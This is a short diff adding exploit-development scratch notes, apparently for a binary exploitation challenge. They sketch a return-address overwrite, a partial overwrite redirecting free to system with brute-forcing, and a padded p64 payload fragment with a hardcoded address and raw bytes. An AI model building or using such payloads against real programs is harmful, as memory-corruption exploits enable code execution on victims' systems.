@@ -1,0 +1,10 @@
+return addr: in main: get_path()
+puts: call -> ret
+free (partial): -> system  (partial bruteforce)
+
+
+35*p64(0x00) + p64(0x401483) + 2*p64(0x00) + \x30\xc3\x04 //TODO: EOF
+
+
+
+
